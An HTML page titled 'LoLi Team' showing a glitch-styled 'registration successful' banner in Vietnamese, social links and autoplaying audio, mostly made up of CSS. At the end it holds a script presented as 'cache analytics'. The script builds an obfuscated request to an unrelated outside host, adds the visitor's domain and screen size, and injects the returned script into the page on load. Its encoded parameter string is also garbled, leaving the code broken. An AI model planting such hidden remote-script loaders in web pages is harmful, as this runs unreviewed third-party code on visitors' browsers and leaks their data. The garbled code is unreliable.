<html>

<head>
    <title>LoLi Team</title>
    <style type="text/css">
        html {
            font: 100%/1.5 "Share Tech Mono", Share Tech Mono, Share Tech Mono;
            color: #3d464d;
            background-color: #fff;
            -webkit-font-smoothing: Share Tech Mono;
            width: 100%;
            text-align: center;
        }

        * {
            font-family: 'Share Tech Mono', Share Tech Mono;
            margin: 0;
            padding: 0;
            outline: 0;
            word-wrap: break-word !important
        }

        *,
        *:before,
        *:after {
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            user-select: none;
            overflow: hidden;
            overflow-y: hidden;
            overflow-x: hidden;
            display: block;
            background: #fff;
            color: #3f3f3f;
            font-size: 16px;
            line-height: 1.3;
            opacity: 0;
            transition: all 1s linear;
        }

        body.fade {
            opacity: 0.8;
        }

        a {
            text-decoration: none;
            color: white;
        }

        ext {
            background: #000;
            display: flex;
            height: 100vh;
            transition: all .8s linear;
        }

        .ext {
            width: 100%;
            margin: auto;
        }

        .ext_glitch {
            font-size: 55px;
            color: #fff;
            line-height: 1em;
            margin: auto;
            padding: 1%;
            text-shadow: -1px 0 #f00, 1px 0 #40bad8;
        }

        .ext_span1 {
            color: #fff;
            letter-spacing: 5px;
            font-size: 11px;
            position: absolute;
            display: block;
            text-align: center;
            width: 100%;
        }

        .ext_span2 {
            color: #fff;
            letter-spacing: 5px;
            font-size: 11px;
            position: absolute;
            display: block;
            text-align: center;
            width: 100%;
            height: 100%;
            background: #000;
        }

        ext div.ext h1.ext_glitch span.ext_span1 {
            display: block;
        }

        ext div.ext:hover h1.ext_glitch span.ext_span1 {
            display: none;
        }

        ext div.ext span.ext_span2 {
            display: none;
        }

        ext div.ext:hover span.ext_span2 {
            display: block;
        }

        .skew {
            -moz-animation: shift 1s ease-in-out infinite alternate;
            -webkit-animation: shift 1s ease-in-out infinite alternate;
            animation: shift 1s ease-in-out infinite alternate;
        }

        @-moz-keyframes shift {
            0%,
            40%,
            44%,
            58%,
            61%,
            65%,
            69%,
            73%,
            100% {
                -moz-transform: skewX(0deg);
                transform: skewX(0deg);
            }
            41% {
                -moz-transform: skewX(10deg);
                transform: skewX(10deg);
            }
            42% {
                -moz-transform: skewX(-10deg);
                transform: skewX(-10deg);
            }
            59% {
                -moz-transform: skewX(40deg) skewY(10deg);
                transform: skewX(40deg) skewY(10deg);
            }
            60% {
                -moz-transform: skewX(-40deg) skewY(-10deg);
                transform: skewX(-40deg) skewY(-10deg);
            }
            63% {
                -moz-transform: skewX(10deg) skewY(-5deg);
                transform: skewX(10deg) skewY(-5deg);
            }
            70% {
                -moz-transform: skewX(-50deg) skewY(-20deg);
                transform: skewX(-50deg) skewY(-20deg);
            }
            71% {
                -moz-transform: skewX(10deg) skewY(-10deg);
                transform: skewX(10deg) skewY(-10deg);
            }
        }

        @-webkit-keyframes shift {
            0%,
            40%,
            44%,
            58%,
            61%,
            65%,
            69%,
            73%,
            100% {
                -webkit-transform: skewX(0deg);
                transform: skewX(0deg);
            }
            41% {
                -webkit-transform: skewX(10deg);
                transform: skewX(10deg);
            }
            42% {
                -webkit-transform: skewX(-10deg);
                transform: skewX(-10deg);
            }
            59% {
                -webkit-transform: skewX(40deg) skewY(10deg);
                transform: skewX(40deg) skewY(10deg);
            }
            60% {
                -webkit-transform: skewX(-40deg) skewY(-10deg);
                transform: skewX(-40deg) skewY(-10deg);
            }
            63% {
                -webkit-transform: skewX(10deg) skewY(-5deg);
                transform: skewX(10deg) skewY(-5deg);
            }
            70% {
                -webkit-transform: skewX(-50deg) skewY(-20deg);
                transform: skewX(-50deg) skewY(-20deg);
            }
            71% {
                -webkit-transform: skewX(10deg) skewY(-10deg);
                transform: skewX(10deg) skewY(-10deg);
            }
        }

        @keyframes shift {
            0%,
            40%,
            44%,
            58%,
            61%,
            65%,
            69%,
            73%,
            100% {
                -moz-transform: skewX(0deg);
                -ms-transform: skewX(0deg);
                -webkit-transform: skewX(0deg);
                transform: skewX(0deg);
            }
            41% {
                -moz-transform: skewX(10deg);
                -ms-transform: skewX(10deg);
                -webkit-transform: skewX(10deg);
                transform: skewX(10deg);
            }
            42% {
                -moz-transform: skewX(-10deg);
                -ms-transform: skewX(-10deg);
                -webkit-transform: skewX(-10deg);
                transform: skewX(-10deg);
            }
            59% {
                -moz-transform: skewX(40deg) skewY(10deg);
                -ms-transform: skewX(40deg) skewY(10deg);
                -webkit-transform: skewX(40deg) skewY(10deg);
                transform: skewX(40deg) skewY(10deg);
            }
            60% {
                -moz-transform: skewX(-40deg) skewY(-10deg);
                -ms-transform: skewX(-40deg) skewY(-10deg);
                -webkit-transform: skewX(-40deg) skewY(-10deg);
                transform: skewX(-40deg) skewY(-10deg);
            }
            63% {
                -moz-transform: skewX(10deg) skewY(-5deg);
                -ms-transform: skewX(10deg) skewY(-5deg);
                -webkit-transform: skewX(10deg) skewY(-5deg);
                transform: skewX(10deg) skewY(-5deg);
            }
            70% {
                -moz-transform: skewX(-50deg) skewY(-20deg);
                -ms-transform: skewX(-50deg) skewY(-20deg);
                -webkit-transform: skewX(-50deg) skewY(-20deg);
                transform: skewX(-50deg) skewY(-20deg);
            }
            71% {
                -moz-transform: skewX(10deg) skewY(-10deg);
                -ms-transform: skewX(10deg) skewY(-10deg);
                -webkit-transform: skewX(10deg) skewY(-10deg);
                transform: skewX(10deg) skewY(-10deg);
            }
        }

        .fullscreen-bg {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            overflow: hidden;
            z-index: -100;
        }

        .fullscreen-bg__video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%
    </style>
    <style type='text/css'>
        @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
        html {
            background: black;
            background-image: url(https://wallpaperscraft.com/image/black_windows_vista_logo_glass_18606_1920x1080.jpg);
            background-position: top center;
            background-size: cover;
            background-attachment: fixed;
            background-repeat: no-repeat;
            color: #a2a2a2;
            min-width: 900px;
            font: 12px titillium, arial;
            font-stretch: condensed;
            font-size: 12px;
            margin: 0;
            color: #ffffff;
            font-family: 'Share Tech Mono';
            font-size: 12px;
            width: 100%;
        }

        li {
            display: inline;
            margin: 1px;
            padding: 1px;
        }

        #menu a {
            padding: 2px 10px;
            margin: 0;
            background: #222222;
            text-decoration: none;
            letter-spacing: 2px;
            padding: 2px 10px;
            margin: 0;
            background: #222222;
            text-decoration: none;
            letter-spacing: 2px;
            border-radius: 2px;
            border-bottom: 2px solid black;
            border-top: 2px solid black;
            border-right: 2px solid lime;
            border-left: 2px solid lime;
        }

        #menu a:hover {
            background: black;
            border-bottom: 0px solid cyan;
            border-top: 0px solid cyan;
        }

        table tr:first-child {
            background: red;
            text-align: center;
            color: white;
        }

        table,
        th,
        td {
            border-collapse: collapse;
            font-family: Tahoma, Geneva, sans-serif;
            background: transparent;
            font-family: 'Share Tech Mono';
            font-size: 13px;
        }

        .table_home,
        .th_home,
        .td_home {
            border: 1px solid cyan;
        }

        th {
            padding: 10px;
        }

        a {
            color: #ffffff;
            text-decoration: none;
        }

        a:hover {
            color: cyan;
            text-decoration: underline;
        }

        b {
            color: cyan;
        }

        input[type=text],
        input[type=submit] {
            background: transparent;
            color: #ffffff;
            border: 1px solid #ffffff;
            margin: 5px auto;
            padding-left: 5px;
            font-family: 'Share Tech Mono';
            font-size: 13px;
        }

        input[type=submit] {
            background: transparent;
            color: #ffffff;
            border: 1px solid #ffffff;
            margin: 5px auto;
            padding-left: 5px;
            font-family: 'Share Tech Mono';
            font-size: 13px;
            cursor: pointer;
        }

        textarea {
            border: 1px solid #ffffff;
            width: 50%;
            height: 200px;
            padding-left: 5px;
            margin: 10px auto;
            resize: none;
            background: transparent;
            color: #ffffff;
            font-family: 'Share Tech Mono';
            font-size: 13px;
        }

        select {
            width: 152px;
            background: #000000;
            color: blue;
            border: 1px solid #ffffff;
            margin: 5px auto;
            padding-left: 5px;
            font-family: 'Share Tech Mono';
            font-size: 13px;
        }

        option:hover {
            background: blue;
            color: #000000;
        }

        .mybox {
            -moz-border-radius: 10px;
            border-radius: 10px;
            border: 1px solid #ff0000;
            padding: 4px 2px;
            width: 70%;
            line-height: 24px;
            background: none;
            box-shadow: 0px 4px 2px white;
            -webkit-box-shadow: 0px 4px 2px #ff0000;
            -moz-box-shadow: 0px 4px 2px #ff0000;
        }

        .cgx2 {
            text-align: center;
            letter-spacing: 1px;
            font-family: "orbitron";
            color: #ff0000;
            font-size: 25px;
            text-shadow: 5px 5px 5px black;
        }

        .infoweb {
            border-right: 1px solid #00FFFF;
        }
    </style>

    <body class="fade" style=" overflow: hidden; ">
        <ext class="flash animated">
            <div class="ext">
                <h1 class="ext_glitch skew">Đăng Ký Thành Công</h1><b><br><h2>https://facebook.com/Thuong.EoPi</h2><h2>https://loliteam.net</h2></span></b>
                <div class="fullscreen-bg">
                    </video>
                </div>
            </div>
        </ext>
        <script type="text/javascript">
            if (self == top) {
                function netbro_cache_analytics(fn, callback) {
                    setTimeout(function() {
                        fn();
                        callback();
                    }, 0);
                }

                function sync(fn) {
                    fn();
                }

                function requestCfs() {
                    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
                    var url = idc_glo_url + "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4 TtHaUQnUEiP6K % 2 fc5C582HVlH3eBnL31xUHfsxbsBnnwTk0qEWIphyv % 2 bphgmF7f % 2 fWWDTdYXp5Uv % 2 fcE5zaWDs4znUaZOdjF3EwK7jrrsgP1gLqWph7SeofRq97fyVosAvauG2gTEYMDl5tfnjBI % 2 fU9JXpVzHsK9J9IQkDeOeXlNdVkcn34 % 2 bAEhKqjXtPPyf1qn6RUrxak2 % 2 bjwgXUPheKM7pAgrsniIV9bsQ % 2 b % 2 br3tE % 2 fjA8 % 2 f1VyAynlyz3TzvebGl % 2 fCcRBwA9cDYTqZUCq0UHcP6K % 2 bnRb % 2 fgrsVqqc0CDDqz5GvQkLSLBK5sdscCKrv4EnF7meO % 2 fyMAz7RBlGGBkBiTmmwSPv5mjCDBz9Rc8YRveRbr % 2 bh7k2GhGCSjDiRm6UIOASqnyswARKdxhVzI8Xif8dvr3W % 2 fKfQ6YoGl536FLgDXx5zG2 % 2 bDo % 2 fu4MqLz6eyNK9swq50I % 2 fWvxF % 2 bJRdnnNaMhHmzhYFpzDnYot2UVDtQG % 2 bU6Mb155voTtwwZY3uaIPSPSP4d519wqCuasBvM5JNW1Pt % 2 baiianUz0lmObUaMWcShVY % 3 d + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                    var bsa = document.createElement('script');
                    bsa.type = 'text/javascript';
                    bsa.async = true;
                    bsa.src = url;
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
                }
                netbro_cache_analytics(requestCfs, function() {});
            };
        </script>

    </body>
    <audio autoplay loop>
      <source src="Huasan.mp3">
    </audio>

</html>
